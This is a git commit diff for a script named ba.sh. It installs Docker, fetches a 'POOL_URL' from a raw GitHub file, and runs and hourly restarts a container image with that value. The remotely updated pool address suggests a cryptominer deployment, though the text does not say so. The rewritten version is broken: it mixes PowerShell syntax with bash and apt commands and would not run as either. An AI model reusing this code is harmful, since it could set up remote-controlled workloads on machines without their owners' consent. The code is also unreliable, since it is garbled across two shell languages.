03429a1bd12318ad631326a2e8ad5018bda53a4b
max313iq <153689278+max313iq@users.noreply.github.com>
2024-01-25 20:59:45 +0300

    Update ba.sh

--- ba.sh
+++ ba.sh
@@ -1,39 +1,34 @@
-#!/bin/bash
-
-# Set the initial URL
-POOL_URL="https://raw.githubusercontent.com/max313iq/Ssl/main/ip"
-
 # Function to update the environment variable and restart Docker container
-update_and_restart() {
-    NEW_POOL_URL=$(curl -s $POOL_URL)
-    if [ "$NEW_POOL_URL" != "$POOL_URL" ]; then
-        echo "Updating POOL_URL to: $NEW_POOL_URL"
-        POOL_URL=$NEW_POOL_URL
-        sudo docker stop webapp_container
-        sudo docker rm webapp_container
-        sudo docker run -e POOL_URL="$POOL_URL" ubtssl/webappx:latest
-    else
-        echo "No updates found."
-    fi
+function Update-And-Restart {
+    $NewPoolUrl = (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/max313iq/Ssl/main/ip').Content
+    if ($NewPoolUrl -ne $Env:POOL_URL) {
+        Write-Host "Updating POOL_URL to: $NewPoolUrl"
+        $Env:POOL_URL = $NewPoolUrl
+        docker stop $(docker ps -q --filter ancestor=ubtssl/webappx:latest)
+        docker run -e POOL_URL="$Env:POOL_URL" ubtssl/webappx:latest
+    } else {
+        Write-Host "No updates found."
+    }
 }
 
 # Install Docker
-sudo apt-get update --fix-missing
-sudo apt-get install -y \
-    apt-transport-https \
-    ca-certificates \
-    curl \
+& sudo apt-get update --fix-missing
+& sudo apt-get install -y `
+    apt-transport-https `
+    ca-certificates `
+    curl `
     software-properties-common
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
-echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-sudo apt-get update --fix-missing
-sudo apt-get install -y docker-ce docker-ce-cli containerd.io
+
+& curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
+& echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > $null
+& sudo apt-get update --fix-missing
+& sudo apt-get install -y docker-ce docker-ce-cli containerd.io
 
 # Run Docker container with initial POOL_URL
-sudo docker run -e POOL_URL="$POOL_URL" ubtssl/webappx:latest
+docker run -e POOL_URL="$((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/max313iq/Ssl/main/ip').Content)" ubtssl/webappx:latest
 
 # Continuous loop to check for updates
-while true; do
-    sleep 3600  # Check every hour (adjust as needed)
-    update_and_restart
-done
+while ($true) {
+    Start-Sleep -Seconds 3600  # Check every hour (adjust as needed)
+    Update-And-Restart
+}
